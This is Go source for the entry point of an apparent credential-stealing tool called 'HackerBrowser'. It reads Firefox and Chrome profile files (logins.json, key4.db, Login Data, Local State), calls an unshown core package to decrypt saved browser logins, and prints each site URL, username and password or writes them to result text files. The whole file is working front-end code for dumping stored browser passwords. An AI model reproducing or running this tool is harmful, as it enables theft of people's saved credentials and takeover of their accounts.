package main

import (
	"HackerBrowser/core"
	"flag"
	"fmt"
	"os"
)
var(
	FirefoxProfile string
	Firefoxdb string
	ChromeProfile string
	ChromeState string
	FileName bool
)
func init(){
	flag.BoolVar(&FileName,"o",false,"return result file")
	flag.StringVar(&Firefoxdb,"k","","firefox key4.db profile")
	flag.StringVar(&FirefoxProfile,"f","","firefox login.json profile")
	flag.StringVar(&ChromeProfile,"c","","Chrome login data profile")
	flag.StringVar(&ChromeState,"s","","Chrome login state profile")
	flag.Parse()
	if FileName == true{
		fmt.Println("[+] Yes,your will got it,To find your resultss")
		err := WriteFile()
		if os.IsExist(err){
		fmt.Println("[+] already exist result floder,to find you result in it")
		}
	}
}

func WriteFile() error{
	err := os.Mkdir("result", os.ModePerm)
	return err
}
func WriteData(i interface{}){
	switch value := i.(type) {
	case []core.FireFoxData:
		file, _ := os.OpenFile("./result/firefox.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
		for _,v := range value{
			_, err := file.WriteString("[+]: "+ v.Url + "\n")
			_, err = file.WriteString("[UserName]: "+ v.UserName + "\n")
			_, err = file.WriteString("[PassWord]: "+ v.PassWord + "\n")
			_, err = file.WriteString("\n")
			if err != nil {
				continue
			}
		}
	case []core.ChromeData:
		file, _ := os.OpenFile("./result/Chrome.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
		for _,v := range value{
			_, err := file.WriteString("[+]: "+ v.Url + "\n")
			_, err = file.WriteString("[UserName]: "+ v.UserName + "\n")
			_, err = file.WriteString("[PassWord]: "+ v.PassWord + "\n")
			_, err = file.WriteString("\n")
			if err != nil {
				continue
			}
		}
	default:
		fmt.Println("can't this value type")
	}
}

func RunFirFox(){
	var firfox core.FireFoxInit
	firfox.ProfilePath = firfox.InitProfile(FirefoxProfile)
	firfox.KeyPath = firfox.InitKey(Firefoxdb)
	data, err := firfox.ReturnData()
	if err != nil {
		fmt.Println(err)
	}else{
		if FileName == true{
			WriteData(data)
		}else{
			for _,value := range data{
				fmt.Println("[+]",value.Url)
				fmt.Println("[UserName]",value.UserName)
				fmt.Println("[PassWord]",value.PassWord)
				fmt.Println("")
			}
		}
	}
}

func RunChrome8(){
	var chrome core.ChromeInit
	chrome.ProfilePath = chrome.InitProfile(ChromeProfile)
	chrome.KeyPath = chrome.InitKey(ChromeState)
	chrome.CopyFile()
	data , err:= chrome.ReturnData8()
	if err != nil {
		fmt.Println(err)
	}else{
		if FileName == true{
			WriteData(data)
		}else{
			for _,value := range data{
				fmt.Println("[+]",value.Url)
				fmt.Println("[UserName]",value.UserName)
				fmt.Println("[PassWord]",value.PassWord)
				fmt.Println("")
			}
		}
	}
}

func RunChrome(){
	var chrome core.ChromeInit
	chrome.ProfilePath = chrome.InitProfile(ChromeProfile)
	chrome.KeyPath = chrome.InitKey(ChromeState)
	chrome.CopyFile()
	data , err:= chrome.ReturnData()
	if err != nil {
		fmt.Println(err)
	}else{
		if FileName == true{
			WriteData(data)
		}else{
			for _,value := range data{
				fmt.Println("[+]",value.Url)
				fmt.Println("[UserName]",value.UserName)
				fmt.Println("[PassWord]",value.PassWord)
				fmt.Println("")
			}
		}
	}
}



func main(){
	RunFirFox()
	RunChrome8()
	RunChrome()
}